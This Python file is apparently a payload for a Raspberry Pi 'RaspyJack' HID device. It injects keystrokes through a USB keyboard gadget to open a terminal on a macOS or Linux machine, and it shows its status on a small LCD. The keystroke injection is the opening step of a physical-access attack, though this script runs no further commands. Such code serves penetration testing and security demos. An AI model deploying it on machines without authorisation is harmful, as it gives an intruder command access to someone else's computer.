#!/usr/bin/env python3
import sys
sys.path.append('/root/Raspyjack/')
"""
RaspyJack *payload* – **HID Attack: Open Terminal (Mac/Linux)**
================================================================
A very simple HID attack that opens the default terminal application
on a macOS or Linux (Debian-based) machine.
"""

import os, sys, subprocess, time
try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    HARDWARE_LIBS_AVAILABLE = True
except ImportError:
    HARDWARE_LIBS_AVAILABLE = False
    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)

from hid_helper import hid_helper # Import the new HID helper

# --- Display Functions ---
def show_message(lines, color="lime"):
    if not HARDWARE_LIBS_AVAILABLE:
        for line in lines:
            print(line)
        return
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 40
    for line in lines:
        draw.text((10, y), line, font=font, fill=color)
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    if not HARDWARE_LIBS_AVAILABLE:
        print("ERROR: Hardware libraries not available. Cannot run HID attack.", file=sys.stderr)
        return

    show_message(["HID Attack:", "Open Terminal"])
    
    if not hid_helper.is_hid_gadget_enabled:
        show_message(["ERROR:", "HID Gadget NOT", "enabled!"], "red")
        time.sleep(3)
        return

    try:
        # macOS shortcut: Cmd+Space, type "Terminal", Enter
        hid_helper.press_modifier_key(hid_helper.keyboard.left_gui, hid_helper.keyboard.space)
        time.sleep(0.5)
        hid_helper.type_string("Terminal")
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.75) # Give it time to open, then try Linux shortcut as fallback
        
        # Linux shortcut: Ctrl+Alt+T
        hid_helper.press_modifier_key(hid_helper.keyboard.left_control, hid_helper.keyboard.left_alt, hid_helper.keyboard.t)
        time.sleep(0.75)
        
        show_message(["Attack Sent!"])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        if HARDWARE_LIBS_AVAILABLE:
            LCD = LCD_1in44.LCD()
            LCD.LCD_Clear()
            GPIO.cleanup()
        print("HID Attack payload finished.")


